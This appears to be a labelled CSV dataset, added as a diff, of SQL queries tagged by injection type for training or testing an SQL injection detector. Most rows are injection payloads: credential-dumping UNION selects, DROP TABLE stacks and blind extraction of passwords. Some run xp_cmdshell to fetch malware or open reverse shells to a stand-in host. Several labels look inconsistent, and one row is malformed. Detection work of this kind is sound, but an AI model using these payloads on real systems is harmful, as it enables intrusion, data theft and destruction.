+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '10'='10';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('exploiting vulnerability'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='locked' WHERE username='' OR '9'='9';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='6';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '9'='9';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1300); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='pending' WHERE user_id='' OR '9'='9';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '9'='9';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked profile'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '9'='9';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE employees;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '9'='9';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE users;--,Time-based,Yes
+UPDATE accounts SET balance=12000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.05; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=160000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='7';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='10';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, phone FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
+UPDATE accounts SET balance=9000 WHERE id=''; EXEC xp_cmdshell('wget http://malicious.com/malware');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '10'='10';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '11'='11';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('security breach detected'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='frozen' WHERE username='' OR '10'='10';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='7';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '10'='10';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1400); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id='' OR '10'='10';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '10'='10';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'compromised account'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='melon' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '10'='10';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '10'='10';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE profiles;--,Time-based,Yes
+UPDATE accounts SET balance=13000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.01; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=170000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='8';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='11';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, address FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE sales;--,Union-based,Yes
+UPDATE accounts SET balance=10000 WHERE id=''; EXEC xp_cmdshell('nc -e cmd.exe malicious.com 4444');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '11'='11';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM employees;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '12'='12';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('database vulnerability found'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='disabled' WHERE username='' OR '11'='11';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='8';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '11'='11';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1500); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='suspended' WHERE user_id='' OR '11'='11';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '11'='11';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked profile'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='peach' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '11'='11';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '11'='11';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE employees;--,Time-based,Yes
+UPDATE accounts SET balance=14000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.005; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=180000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='9';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='12';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT first_name, last_name FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
+UPDATE accounts SET balance=11000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com/shell');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '12'='12';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '13'='13';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('malicious activity detected'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='locked' WHERE username='' OR '12'='12';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='9';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '12'='12';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1600); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '12'='12';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE orders;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '12'='12';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'breached account'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='plum' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '12'='12';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '12'='12';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE profiles;--,Time-based,Yes
+UPDATE accounts SET balance=15000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.0001; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=190000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='10';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='13';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, password FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE promotions;--,Union-based,Yes
+UPDATE accounts SET balance=12000 WHERE id=''; EXEC xp_cmdshell('bash -i >& /dev/tcp/malicious.com/4444 0>&1');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '13'='13';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, credit_card FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '14'='14';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('unauthorized access detected'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='frozen' WHERE username='' OR '13'='13';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='10';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '13'='13';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1700); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='pending' WHERE user_id='' OR '13'='13';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '13'='13';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked data'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='berry' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '13'='13';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '13'='13';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE promotions;--,Time-based,Yes
+UPDATE accounts SET balance=16000 WHERE id=''; EXEC sp_executesql N'DROP TABLE payments';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.00001; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=200000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='11';--,Boolean-based,Yes
+SELECT * FROM users WHERE username=''; WAITFOR DELAY '00:00:10';--,Time-based,Yes
+SELECT * FROM accounts WHERE user_id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END);--,Time-based,Yes
+SELECT * FROM payments WHERE amount = '10',,pg_sleep(10);--
+SELECT * FROM accounts WHERE balance = 100; AND 1=1--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id = 1 AND 'a' = 'b';--,Boolean-based,Yes
+UPDATE products SET price=0 WHERE id=1; WAITFOR DELAY '00:00:05';--,Time-based,Yes
+SELECT * FROM users WHERE id='1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sysobjects WHERE type='U')>10 THEN pg_sleep(5) ELSE pg_sleep(0) END);--,Time-based,Yes
+SELECT * FROM accounts WHERE balance = 100; AND SLEEP(5);--,Time-based,Yes
+"SELECT * FROM orders WHERE order_id = 1; AND (SELECT IF(1=1, SLEEP(5), 0));--",Time-based,Yes
+"SELECT * FROM products WHERE id = ''; UNION SELECT NULL, pg_sleep(10);--",Time-based,Yes
+"SELECT * FROM orders WHERE order_id = ''; UNION ALL SELECT NULL, pg_sleep(10);--",Time-based,Yes
+SELECT * FROM files WHERE file_id = 1; AND pg_sleep(10);--,Time-based,Yes
+SELECT * FROM users WHERE id = ''; AND 1=1;--,Boolean-based,Yes
+SELECT * FROM accounts WHERE balance = 100 AND 1=1;--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id = ''; AND 1=2;--,Boolean-based,Yes
+SELECT * FROM customers WHERE email = ''; AND 'x'='x';--,Boolean-based,Yes
+SELECT * FROM employees WHERE emp_id = ''; AND 'x'='y';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = ''; AND LENGTH(username) > 5;--,Boolean-based,Yes
+"SELECT * FROM accounts WHERE balance = 100 AND IF(1=1, 1, 0);--",Boolean-based,Yes
+"SELECT * FROM orders WHERE id = ''; AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97;--",Boolean-based,Yes
+"SELECT * FROM employees WHERE emp_id = ''; AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), 1, 0);--",Boolean-based,Yes
+"SELECT * FROM customers WHERE email = ''; AND IF(LENGTH((SELECT username FROM users LIMIT 1)) > 5, 1, 0);--",Boolean-based,Yes
+"SELECT * FROM users WHERE id = ''; UNION SELECT NULL, NULL;--",Union-based,Yes
+"SELECT * FROM products WHERE id = ''; UNION SELECT 1, 2;--",Union-based,Yes
+"SELECT * FROM accounts WHERE id = ''; UNION SELECT version(), NULL;--",Union-based,Yes
+"SELECT * FROM orders WHERE order_id = ''; UNION SELECT user(), database();--",Union-based,Yes
+"SELECT * FROM employees WHERE emp_id = ''; UNION SELECT CURRENT_USER(), @@hostname;--",Union-based,Yes
+SELECT * FROM customers WHERE email = ''; UNION SELECT table_name FROM information_schema.tables;--,Union-based,Yes
+SELECT * FROM logs WHERE log_id = ''; UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users';--,Union-based,Yes
+"SELECT * FROM payments WHERE payment_id = ''; UNION ALL SELECT @@version_comment, @@version_compile_os;--",Union-based,Yes
+"SELECT * FROM users WHERE id = ''; UNION ALL SELECT NULL, SLEEP(5);--",Union-based,Yes
+"SELECT * FROM accounts WHERE balance = 100; UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';--",Union-based,Yes
+SELECT * FROM users WHERE id = ''; SLEEP(5);--,Time-based,Yes
+SELECT * FROM orders WHERE order_id = ''; AND SLEEP(3);--,Time-based,Yes
+SELECT * FROM accounts WHERE id = ''; OR SLEEP(2);--,Time-based,Yes
+"SELECT * FROM products WHERE id = ''; AND IF(1=1, SLEEP(5), 0);--",Time-based,Yes
+"SELECT * FROM customers WHERE email = ''; OR IF(EXISTS(SELECT 1 FROM users), SLEEP(5), 0);--",Time-based,Yes
+"SELECT * FROM employees WHERE emp_id = ''; AND IF(LENGTH((SELECT password FROM users LIMIT 1)) > 5, SLEEP(5), 0);--",Time-based,Yes
+"SELECT * FROM orders WHERE id = ''; OR IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) > 70, SLEEP(5), 0);--",Time-based,Yes
+"SELECT * FROM accounts WHERE balance = 100; IF(1=1, SLEEP(10), 0);--",Time-based,Yes
+"SELECT * FROM payments WHERE payment_id = ''; AND BENCHMARK(1000000, SHA1(1));--",Time-based,Yes
+SELECT * FROM logs WHERE log_id = ''; UNION SELECT SLEEP(5);--,Time-based,Yes
+SELECT * FROM users WHERE id = ''; AND 1/0;--,Error-based,Yes
+SELECT * FROM products WHERE id = ''; AND (SELECT 1 FROM non_existent_table);--,Error-based,Yes
+SELECT * FROM orders WHERE order_id = ''; AND EXP(1000);--,Error-based,Yes
+SELECT * FROM accounts WHERE id = ''; AND (SELECT 1 FROM information_schema.tables WHERE table_name='non_existent');--,Error-based,Yes
+SELECT * FROM customers WHERE email = ''; AND (SELECT 1 FROM non_existent_column);--,Error-based,Yes
+"SELECT * FROM employees WHERE emp_id = ''; UNION SELECT NULL, CAST('test' AS INT);--",Error-based,Yes
+SELECT * FROM logs WHERE log_id = ''; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='non_existent');--,Error-based,Yes
+SELECT * FROM payments WHERE payment_id = ''; AND (SELECT 1/0);--,Error-based,Yes
+"SELECT * FROM accounts WHERE id = ''; UNION SELECT NULL, EXP(999999999);--",Error-based,Yes
+"SELECT * FROM users WHERE id = ''; AND (SELECT CONVERT('a', UNSIGNED INTEGER));--",Error-based,Yes
+SELECT * FROM employees WHERE emp_id = 5;,None,No
+SELECT * FROM orders WHERE order_date = '2023-01-01';,None,No
+"SELECT name, price FROM products WHERE price > 100;",None,No
+SELECT * FROM users WHERE username = 'admin';,None,No
+DELETE FROM sessions WHERE session_id = 'abc123';,None,No
+UPDATE accounts SET balance = 1000 WHERE account_id = 1;,None,No
+SELECT * FROM transactions WHERE transaction_id = 12345;,None,No
+"SELECT first_name, last_name FROM customers WHERE customer_id = 500;",None,No
+"INSERT INTO orders (customer_id, product_id, quantity) VALUES (1, 100, 2);",None,No
+SELECT * FROM payments WHERE payment_date = '2024-01-01';,None,No
+SELECT * FROM logs WHERE log_date = CURRENT_DATE;,None,No
+SELECT * FROM products WHERE product_name = 'Laptop';,None,No
+UPDATE employees SET position = 'Manager' WHERE emp_id = 3;,None,No
+DELETE FROM carts WHERE cart_id = 10;,None,No
+SELECT * FROM accounts WHERE account_status = 'active';,None,No
+SELECT * FROM orders WHERE total_amount > 500;,None,No
+SELECT customer_id FROM invoices WHERE invoice_id = 200;,None,No
+SELECT product_name FROM products WHERE category = 'Electronics';,None,No
+SELECT * FROM feedback WHERE rating = 5;,None,No
+"INSERT INTO customers (first_name, last_name, email) VALUES ('John', 'Doe', 'john@example.com');",None,No
+SELECT * FROM employees WHERE hire_date = '2020-01-15';,None,No
+"SELECT product_id, stock FROM inventory WHERE stock < 50;",None,No
+UPDATE products SET price = 19.99 WHERE product_id = 5;,None,No
+DELETE FROM orders WHERE order_status = 'cancelled';,None,No
+SELECT * FROM invoices WHERE due_date = '2023-12-31';,None,No
+"INSERT INTO payments (order_id, amount) VALUES (123, 150.00);",None,No
+SELECT * FROM users WHERE user_role = 'admin';,None,No
+SELECT * FROM categories WHERE parent_category_id = 1;,None,No
+SELECT COUNT(*) FROM employees WHERE department_id = 2;,None,No
+DELETE FROM logs WHERE log_date < '2022-01-01';,None,No
+SELECT email FROM users WHERE user_id = 10;,None,No
+SELECT * FROM products WHERE in_stock = true;,None,No
+SELECT first_name FROM customers WHERE last_name = 'Smith';,None,No
+UPDATE accounts SET account_type = 'premium' WHERE account_id = 2;,None,No
+SELECT * FROM orders WHERE shipping_address IS NOT NULL;,None,No
+DELETE FROM products WHERE discontinued = true;,None,No
+SELECT COUNT(*) FROM orders WHERE order_status = 'shipped';,None,No
+SELECT DISTINCT category FROM products;,None,No
+"INSERT INTO users (username, password) VALUES ('newuser', 'securepass');",None,No
+SELECT AVG(price) FROM products WHERE category_id = 4;,None,No
+SELECT * FROM invoices WHERE customer_id = 3 AND paid = false;,None,No
+UPDATE inventory SET stock = stock - 1 WHERE product_id = 100;,None,No
+SELECT * FROM sessions WHERE last_activity > NOW() - INTERVAL 30 MINUTE;,None,No
+SELECT * FROM transactions WHERE transaction_date BETWEEN '2023-01-01' AND '2023-12-31';,None,No
+"INSERT INTO feedback (user_id, comment) VALUES (1, 'Great service!');",None,No
+SELECT * FROM customers WHERE country = 'USA';,None,No
+DELETE FROM carts WHERE user_id = 5 AND cart_status = 'empty';,None,No
+SELECT MAX(salary) FROM employees WHERE department_id = 3;,None,No
+SELECT * FROM products WHERE price BETWEEN 10 AND 50;,None,No
+UPDATE users SET email = 'john.doe@example.com' WHERE user_id = 1;,None,No
+SELECT product_name FROM products WHERE rating >= 4.5;,None,No
+SELECT * FROM logs WHERE action = 'login' ORDER BY timestamp DESC;,None,No
+SELECT * FROM payments WHERE payment_method = 'credit_card';,None,No
+"INSERT INTO orders (customer_id, product_id, quantity) VALUES (2, 50, 3);",None,No
+SELECT * FROM employees WHERE active = true;,None,No
+DELETE FROM users WHERE last_login < '2022-01-01';,None,No
+SELECT * FROM categories WHERE parent_id IS NULL;,None,No
+"SELECT username FROM users WHERE id IN (1, 2, 3);",None,No
+UPDATE products SET price = price * 1.10 WHERE category_id = 1;,None,No
+SELECT * FROM orders WHERE order_total > 100;,None,No
+SELECT * FROM users WHERE registration_date > '2024-01-01';,None,No
+"INSERT INTO transactions (user_id, amount, date) VALUES (1, 200.00, NOW());",None,No
+SELECT * FROM products WHERE supplier_id = 5 AND available = true;,None,No
+SELECT COUNT(*) FROM customers WHERE signup_date BETWEEN '2023-01-01' AND '2023-12-31';,None,No
+SELECT * FROM products WHERE brand = 'Apple';,None,No
+"SELECT user_id, COUNT(*) AS order_count FROM orders GROUP BY user_id;",None,No
+UPDATE customers SET last_login = NOW() WHERE user_id = 1;,None,No
+SELECT * FROM invoices WHERE status = 'paid';,None,No
+DELETE FROM users WHERE user_role = 'guest';,None,No
+SELECT MIN(price) FROM products WHERE category_id = 2;,None,No
+SELECT * FROM sessions WHERE user_id = 4 AND active = true;,None,No
+SELECT DISTINCT product_id FROM orders WHERE user_id = 3;,None,No
+"INSERT INTO products (name, price, category_id) VALUES ('New Product', 99.99, 1);",None,No
+SELECT * FROM orders WHERE customer_id = 2 AND order_date > '2023-01-01';,None,No
+UPDATE products SET in_stock = false WHERE id = 20;,None,No
+SELECT * FROM users WHERE created_at < '2024-01-01';,None,No
+SELECT COUNT(*) FROM employees WHERE position = 'Developer';,None,No
+SELECT * FROM logs WHERE log_type = 'error' AND timestamp > '2024-01-01';,None,No
+DELETE FROM orders WHERE order_date < '2022-01-01';,None,No
+SELECT * FROM feedback WHERE rating >= 4;,None,No
+SELECT user_id FROM payments WHERE amount > 100;,None,No
+"INSERT INTO users (username, email) VALUES ('new_user', 'new_user@example.com');",None,No
+"SELECT product_name, price FROM products WHERE discontinued = false;",None,No
+SELECT AVG(rating) FROM reviews WHERE product_id = 15;,None,No
+UPDATE accounts SET balance = balance + 100 WHERE account_id = 3;,None,No
+SELECT * FROM orders WHERE shipping_method = 'express';,None,No
+SELECT * FROM categories WHERE is_active = true;,None,No
+SELECT * FROM payments WHERE payment_status = 'pending';,None,No
+DELETE FROM carts WHERE updated_at < NOW() - INTERVAL 30 DAY;,None,No
+SELECT * FROM users WHERE email LIKE '%@example.com';,None,No
+SELECT COUNT(DISTINCT customer_id) FROM orders;,None,No
+"INSERT INTO transactions (user_id, amount, transaction_date) VALUES (2, 150.00, NOW());",None,No
+SELECT * FROM sessions WHERE session_id = 'xyz';,None,No
+SELECT * FROM invoices WHERE due_date < NOW();,None,No
+SELECT * FROM products WHERE quantity > 0 ORDER BY price ASC;,None,No
+DELETE FROM products WHERE created_at < '2020-01-01';,None,No
+SELECT * FROM customers WHERE phone_number IS NOT NULL;,None,No
+"SELECT first_name, last_name FROM employees WHERE department_id = 2;",None,No
+UPDATE orders SET status = 'completed' WHERE order_id = 5;,None,No
+SELECT * FROM products WHERE release_date > '2023-01-01';,None,No
+DELETE FROM sessions WHERE user_id = 6;,None,No
+SELECT MAX(order_total) FROM orders WHERE customer_id = 3;,None,No
+SELECT * FROM invoices WHERE payment_method = 'bank_transfer';,None,No
+"INSERT INTO customers (first_name, last_name) VALUES ('Jane', 'Doe');",None,No
+SELECT * FROM products WHERE rating IS NOT NULL;,None,No
+SELECT product_id FROM orders WHERE quantity >= 10;,None,No
+UPDATE users SET last_name = 'Smith' WHERE user_id = 4;,None,No
+SELECT * FROM transactions WHERE status = 'failed';,None,No
